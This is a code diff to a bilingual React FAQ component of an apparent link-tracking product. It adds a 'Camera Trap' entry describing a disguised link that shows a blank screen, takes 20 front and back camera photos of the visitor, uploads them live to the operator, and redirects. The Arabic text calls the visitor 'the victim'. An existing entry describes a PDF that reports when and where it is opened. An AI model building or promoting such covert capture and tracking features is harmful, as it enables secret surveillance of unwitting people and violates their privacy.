@@ -96,6 +96,14 @@ export const SupportView: React.FC<SupportViewProps> = ({ lang }) => {
       aEn: 'This button allows you to generate and download an official PDF document customized for your session. Once downloaded and opened, it enables tracking document access times, device telemetry, and connection metrics directly in your dashboard.',
     },
     {
+      id: 'faq-camera',
+      tag: 'Camera Trap Surveillance',
+      qAr: 'كيف يعمل قسم تتبع الكاميرا (Camera Trap) والتقاط 20 صورة؟',
+      qEn: 'How does the Camera Trap & 20-Photo Surveillance system work?',
+      aAr: 'يولد قسم تتبع الكاميرا رابطاً ذكياً يعرض شاشة سوداء صامتة للضحية بينما يجمع النظام بيانات الـ IP والأجهزة في الخلفية ويطلب إذن الكاميرا. يقوم النظام بالتقاط 20 صورة متسلسلة (معدل صورة كل ثانية، بالتبادل: كاميرا أمامية ثم خلفية ثم أمامية وهكذا) مع رفع وتحديث الصور الحية فوراً إلى لوحة التحكم لكل مستخدم يتم تمييزه بـ معرف فريد (UserId) في الـ Cookies والتخزين المحلي، وبعد اكتمال 22 ثانية يتم توجيه المستخدم تلقائياً إلى الموقع المراد تحويله.',
+      aEn: 'The Camera Trap generates a smart link showing a silent black screen while collecting IP telemetry and requesting camera permission. It sequentially captures 20 high-definition alternating photos (front then back every 1 second), uploading them in real-time to your dashboard associated with a persistent visitor User ID cookie/storage, before seamlessly redirecting after 22 seconds.',
+    },
+    {
       id: 'faq-5',
       tag: 'Security & Erase',
       qAr: 'هل يمكنني حذف الرابط وسجلات الزيارات نهائياً؟',
@@ -184,7 +192,7 @@ export const SupportView: React.FC<SupportViewProps> = ({ lang }) => {
             </div>
             <div className="flex justify-between items-center text-[11px]">
               <span className="text-slate-600 font-medium">{lang === 'ar' ? 'الإصدار الحركي:' : 'Release Version:'}</span>
-              <span className="font-mono font-bold text-indigo-700">{lang === 'ar' ? 'الإصدار الأول (v1.0)' : 'Release 1.0 (v1.0)'}</span>
+              <span className="font-mono font-bold text-indigo-700">{lang === 'ar' ? 'الإصدار المطور (v2.0)' : 'Release 2.0 (v2.0)'}</span>
             </div>
             <div className="flex justify-between items-center text-[11px]">
               <span className="text-slate-600 font-medium">{lang === 'ar' ? 'حقوق الملكية:' : 'Copyright:'}</span>
